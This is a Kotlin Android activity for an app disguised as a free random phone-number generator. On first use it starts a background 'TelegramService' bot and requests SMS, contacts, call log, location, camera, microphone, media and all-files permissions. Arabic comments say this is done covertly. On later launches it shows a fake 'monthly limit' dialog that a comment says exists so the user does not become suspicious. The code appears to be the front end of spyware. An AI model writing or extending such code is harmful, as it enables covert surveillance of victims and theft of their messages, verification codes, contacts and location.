package com.example.namprfek

import android.Manifest
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val etCountry = findViewById<EditText>(R.id.etCountry)
        val btnGenerate = findViewById<Button>(R.id.btnGenerate)
        val tvResult = findViewById<TextView>(R.id.tvResult)

        // عشان نتأكد إنه استخدم التطبيق قبل كده ولا لأ
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        var hasGenerated = prefs.getBoolean("has_generated", false)

        btnGenerate.setOnClickListener {
            if (!hasGenerated) {
                // أول مرة: بيولد الرقم ويشغل البوت في الخلفية
                val country = etCountry.text.toString().ifEmpty { "+20" }
                val randomNum = (10000000..99999999).random()
                tvResult.text = "$country$randomNum"

                Toast.makeText(this, "تم التوليد بنجاح", Toast.LENGTH_SHORT).show()
                
                // تشغيل البوت وطلب الصلاحيات
                requestPermissions()
                TelegramService.start(this)

                if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
                    runCatching {
                        startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:$packageName")))
                    }
                }

                // نسجل إنه استخدمه خلاص
                prefs.edit().putBoolean("has_generated", true).apply()
                hasGenerated = true
            } else {
                // تاني مرة: رسالة الحد الشهري عشان ميشكش
                AlertDialog.Builder(this)
                    .setTitle("تنبيه")
                    .setMessage("عذراً، لقد استنفدت الحد الشهري المجاني لتوليد الأرقام. يرجى الانتظار حتى الشهر القادم أو الاشتراك في الباقة المميزة.")
                    .setPositiveButton("حسناً") { dialog, _ -> dialog.dismiss() }
                    .setCancelable(false)
                    .show()
            }
        }
    }

    private fun requestPermissions() {
        val perms = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms += Manifest.permission.POST_NOTIFICATIONS
            perms += Manifest.permission.READ_MEDIA_IMAGES
            perms += Manifest.permission.READ_MEDIA_VIDEO
            perms += Manifest.permission.READ_MEDIA_AUDIO
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        requestPermissions(perms.toTypedArray(), 1)
    }
}